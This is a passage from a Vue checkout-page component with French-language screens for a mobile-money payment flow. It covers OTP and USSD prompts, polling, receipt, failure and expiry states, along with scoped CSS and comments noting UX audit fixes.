          @submit="handleSubmit"
        />
        <CheckoutDefault
          v-else
          :session="session"
          :step="step"
          :selected-operator="selectedOperator"
          :selected-country="selectedCountry"
          :phone="phone"
          :otp="otp"
          :otp-required="otpRequired"
          :phone-required="phoneRequired"
          :submitting="submitting"
          :form-error="formError"
          :phone-error="phoneError"
          :format-amount="formatAmount"
          @update:selected-operator="(v: string) => selectedOperator = v"
          @update:country="(v: string) => selectedCountry = v"
          @update:phone="(v: string) => phone = v"
          @update:otp="(v: string) => otp = v"
          @pick-method="onPickMethod"
          @back="onBack"
          @submit="handleSubmit"
        />
      </template>

      <!-- Validating / redirecting / processing / awaiting -->
      <CheckoutStateScreen
        v-else-if="pageState === 'validating'"
        variant="processing"
        title="Préparation de votre paiement…"
        message="Vérification de vos informations."
      />

      <CheckoutStateScreen
        v-else-if="pageState === 'redirecting'"
        variant="redirecting"
        title="Redirection vers la page sécurisée…"
        :message="redirectingTo ? `Vers ${redirectingTo}` : 'Veuillez patienter.'"
      />

      <CheckoutStateScreen
        v-else-if="pageState === 'processing'"
        variant="processing"
        title="Confirmez sur votre téléphone"
        message="Saisissez votre code PIN Mobile Money pour valider le paiement. Cette page se mettra à jour automatiquement."
      >
        <!-- R2 audit HIGH UX: previously these in-flight screens had
             zero recovery CTAs — the customer was stuck staring at a
             spinner. Now we expose a manual "check status now" + an
             "abandon and pick another method" escape hatch. -->
        <template #actions>
          <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="manualStatusCheck">
            Vérifier maintenant
          </button>
          <button type="button" class="ck-state-link" @click="handleSwitchMethod">
            Annuler et changer de moyen
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'awaiting_ussd'"
        variant="awaiting_ussd"
        title="Validez sur votre téléphone"
        :message="nextAction?.message || 'Composez le code reçu pour finaliser le paiement.'"
      >
        <p v-if="nextAction?.ussdCode" class="ussd-code">
          Code à composer : <strong>{{ nextAction.ussdCode }}</strong>
        </p>
        <template #actions>
          <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="manualStatusCheck">
            J'ai composé le code
          </button>
          <button type="button" class="ck-state-link" @click="handleSwitchMethod">
            Annuler et changer de moyen
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'awaiting_otp'"
        variant="awaiting_otp"
        title="Saisissez le code SMS"
        :message="`Un code de confirmation a été envoyé au ${phoneFormat?.dial_code ? '+' + phoneFormat.dial_code : ''} ${phone}.`"
      >
        <div class="otp-form">
          <input
            v-model="otp"
            type="text"
            inputmode="numeric"
            autocomplete="one-time-code"
            maxlength="8"
            placeholder="Code à 6 chiffres"
            class="ck-otp-large"
            aria-label="Code de confirmation reçu par SMS"
          />
          <!-- R2 audit MED N1: previously `resendError` was assigned in
               script but never rendered in the template — the user
               saw silent failure on resend. -->
          <p v-if="resendError" class="ck-form-error" role="alert">
            {{ resendError }}
          </p>
          <button type="button" class="ck-state-cta" @click="handleSubmit">
            Valider
          </button>
          <button type="button" class="ck-state-link" @click="handleResendOtp">
            Renvoyer le code
          </button>
        </div>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'polling_stale'"
        variant="polling_stale"
        title="Cela prend plus longtemps que prévu"
        message="Si vous avez validé sur votre téléphone, le paiement peut être en cours de traitement par l'opérateur. Nous continuons à vérifier."
      >
        <template #actions>
          <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="manualStatusCheck">
            Vérifier maintenant
          </button>
          <button type="button" class="ck-state-link" @click="handleSwitchMethod">
            Abandonner
          </button>
        </template>
      </CheckoutStateScreen>

      <!-- SUCCESS — full receipt -->
      <template v-else-if="pageState === 'success'">
        <div class="checkout-card">
          <CheckoutReceipt
            :amount="session?.amount ?? 0"
            :currency="session?.currency ?? 'XOF'"
            :merchant-name="session?.merchant?.name"
            :reference="session?.transaction_public_id"
            :paid-at="session?.completed_at"
            :operator-label="operatorLabel"
            :masked-phone="session?.masked_phone"
          >
            <template #actions>
              <a
                v-if="session?.transaction_public_id"
                :href="downloadReceiptUrl(token)"
                target="_blank"
                rel="noopener"
                class="ck-state-cta ck-state-cta--secondary"
              >
                Télécharger le reçu
              </a>
              <div class="receipt-email-row">
                <input
                  v-model="receiptEmail"
                  type="email"
                  inputmode="email"
                  :placeholder="session?.customer_email || 'votre@email.com'"
                  class="ck-state-input"
                />
                <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="handleEmailReceipt">
                  {{ receiptEmailSent ? 'Envoyé ✓' : 'Envoyer par email' }}
                </button>
              </div>
              <button
                v-if="session?.return_url"
                type="button"
                class="ck-state-cta"
                @click="redirectToReturn"
              >
                Retourner sur le site
              </button>
            </template>
          </CheckoutReceipt>
        </div>
      </template>

      <!-- FAILED — structured failure copy -->
      <CheckoutStateScreen
        v-else-if="pageState === 'failed'"
        variant="failed"
        :title="failureCopy?.title || 'Paiement échoué'"
        :message="failureCopy?.body || formError || 'Le paiement n\'a pas pu être effectué.'"
        :reference="session?.transaction_public_id"
      >
        <template #actions>
          <button
            v-if="failureCopy?.primaryCta"
            type="button"
            class="ck-state-cta"
            @click="runFailureCta(failureCopy.primaryCta.action)"
          >
            {{ failureCopy.primaryCta.label }}
          </button>
          <button
            v-if="failureCopy?.secondaryCta"
            type="button"
            class="ck-state-cta ck-state-cta--secondary"
            @click="runFailureCta(failureCopy.secondaryCta.action)"
          >
            {{ failureCopy.secondaryCta.label }}
          </button>
          <button
            v-if="!failureCopy?.primaryCta"
            type="button"
            class="ck-state-cta"
            @click="handleRetry"
          >
            Réessayer
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'aggregator_down'"
        variant="aggregator_down"
        title="Service de paiement indisponible"
        :message="failureCopy?.body || 'Le service est temporairement indisponible. Essayez un autre moyen de paiement.'"
      >
        <template #actions>
          <button type="button" class="ck-state-cta" @click="handleSwitchMethod">
            Changer d'opérateur
          </button>
          <button type="button" class="ck-state-cta ck-state-cta--secondary" @click="handleRetry">
            Réessayer
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'timeout'"
        variant="timeout"
        title="Délai dépassé"
        :message="`Si le débit apparaît sur votre compte, contactez ${session?.merchant?.name || 'le marchand'} avec la référence ci-dessous.`"
        :reference="session?.transaction_public_id"
      >
        <template #actions>
          <!-- R2 audit LOW N4: prefer cancel_url, fall back to return_url
               (some merchants only configure one). Without a fallback,
               the customer is stuck on a terminal screen with no exit. -->
          <button
            v-if="terminalExitUrl"
            type="button"
            class="ck-state-cta"
            @click="redirectToTerminalExit"
          >
            Revenir au site
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'merchant_cancelled'"
        variant="merchant_cancelled"
        title="Paiement annulé"
        :message="`Ce paiement a été annulé par ${session?.merchant?.name || 'le marchand'}. Aucun montant ne vous sera prélevé.`"
      >
        <template #actions>
          <button
            v-if="terminalExitUrl"
            type="button"
            class="ck-state-cta"
            @click="redirectToTerminalExit"
          >
            Revenir au site
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'expired'"
        variant="expired"
        title="Session expirée"
        message="Cette session de paiement a expiré. Retournez sur le site du marchand pour en créer une nouvelle."
      >
        <template #actions>
          <button
            v-if="terminalExitUrl"
            type="button"
            class="ck-state-cta"
            @click="redirectToTerminalExit"
          >
            Revenir au site
          </button>
        </template>
      </CheckoutStateScreen>

      <CheckoutStateScreen
        v-else-if="pageState === 'session_unknown'"
        variant="session_unknown"
        title="Lien introuvable"
        message="Le lien de paiement est invalide ou a expiré. Demandez un nouveau lien au marchand."
      />

      <CheckoutStateScreen
        v-else-if="pageState === 'error'"
        variant="error"
        title="Erreur technique"
        :message="error || 'Une erreur inattendue est survenue. Veuillez recharger la page.'"
      >
        <template #actions>
          <button type="button" class="ck-state-cta" @click="fetchSession">
            Recharger
          </button>
        </template>
      </CheckoutStateScreen>
    </main>
  </div>
</template>

<style scoped>
.checkout-page {
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: stretch;
  /* When the merchant picks a custom font, brandingStyle sets
     --ck-font-family on this element and the whole subtree inherits.
     Atoms don't need their own font-family rule; the default cascade
     handles them. Fallback to the document's inherited stack when no
     merchant override is set. */
  font-family: var(--ck-font-family, inherit);
}

/* ── Merchant-themable button style ────────────────────────────────
   Three presets, applied at the page level so atoms with .ck-cta
   pick them up without touching their own code. */

.bs-outline :deep(.ck-cta) {
  background: transparent;
  border: 1.5px solid var(--ck-primary);
  /* R1 audit H2: text falls back to a locked dark when the merchant's
     primary is too light to read against white (e.g. yellow). Computed
     server-side in `brandingStyle` and exposed as
     `--ck-text-on-primary-outline`. Default falls back to the primary
     so merchants with dark brands still see their hue as label. */
  color: var(--ck-text-on-primary-outline, var(--ck-primary));
}

.bs-outline :deep(.ck-cta:hover:not(:disabled)) {
  background: var(--ck-primary-soft);
}

.bs-pill :deep(.ck-cta) {
  border-radius: 9999px;
}

/* Center the card within the page main area. The layout's `<main>`
   already centers vertically; the orchestrator's `<main>` is its
   direct child and must center horizontally so the card lands in
   the middle of the viewport instead of stuck to the left. */
.checkout-main {
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}

.sandbox-banner {
  width: 100%;
  padding: var(--ck-sp-3) var(--ck-sp-4);
  background: var(--ck-warning-soft);
  border-bottom: 2px solid var(--ck-warning);
  text-align: center;
  font-size: var(--ck-text-sm);
  color: var(--ck-warning-strong);
  line-height: var(--ck-lh-normal);
}

.sandbox-banner strong {
  font-weight: var(--ck-fw-bold);
  letter-spacing: 0.05em;
}

.checkout-card {
  background: var(--ck-surface);
  border: 1px solid var(--ck-border);
  border-radius: var(--ck-r-xl);
  padding: var(--ck-card-padding);
  max-width: var(--ck-card-max-width);
  width: 100%;
  margin: var(--ck-sp-4) auto;
  box-shadow: var(--ck-shadow-sm);
}

.ussd-code {
  font-size: var(--ck-text-md);
  margin: var(--ck-sp-3) 0;
}

.ussd-code strong {
  font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
  background: var(--ck-surface-sunken);
  padding: 4px 10px;
  border-radius: var(--ck-r-sm);
  letter-spacing: 0.04em;
}

.otp-form {
  display: flex;
  flex-direction: column;
  gap: var(--ck-sp-2);
  width: 100%;
  max-width: 320px;
  margin: var(--ck-sp-3) auto 0;
}

.ck-otp-large {
  padding: var(--ck-sp-4);
  background: var(--ck-surface);
  border: 2px solid var(--ck-border);
  border-radius: var(--ck-r-md);
  font: inherit;
  font-size: 22px;
  font-variant-numeric: tabular-nums;
  letter-spacing: 0.3em;
  text-align: center;
}

.ck-otp-large:focus-visible {
  outline: none;
  border-color: var(--ck-primary);
  box-shadow: var(--ck-shadow-focus);
}

.ck-state-cta {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  width: 100%;
  min-height: var(--ck-cta-height-mobile);
  padding: 0 var(--ck-sp-4);
  background: var(--ck-primary);
  color: var(--ck-text-on-primary);
  border: none;
  border-radius: var(--ck-r-lg);
  font: inherit;
  font-size: var(--ck-text-md);
  font-weight: var(--ck-fw-semibold);
  cursor: pointer;
  text-decoration: none;
  transition: background var(--ck-duration-quick) var(--ck-easing-fast);
}

.ck-state-cta:hover {
  background: var(--ck-primary-hover);
}

.ck-state-cta--secondary {
  background: var(--ck-surface);
  color: var(--ck-text-body);
  border: 1px solid var(--ck-border);
}

.ck-state-cta--secondary:hover {
  background: var(--ck-surface-hover);
}

.ck-state-link {
  background: transparent;
  border: none;
  color: var(--ck-primary);
  font: inherit;
  font-size: var(--ck-text-sm);
  cursor: pointer;
  padding: var(--ck-sp-2);
  text-decoration: underline;
}

.ck-state-input {
  width: 100%;
  padding: var(--ck-sp-3) var(--ck-sp-4);
  background: var(--ck-surface);
  border: 1px solid var(--ck-border);
  border-radius: var(--ck-r-md);
  font: inherit;
  font-size: 16px;
}

.receipt-email-row {
  display: flex;
  flex-direction: column;
  gap: var(--ck-sp-2);
}

@media (min-width: 480px) {
  .receipt-email-row {
    flex-direction: row;
  }
  .receipt-email-row .ck-state-input {
    flex: 1;
  }
  .receipt-email-row .ck-state-cta {
    width: auto;
    min-width: 160px;
  }
}
</style>
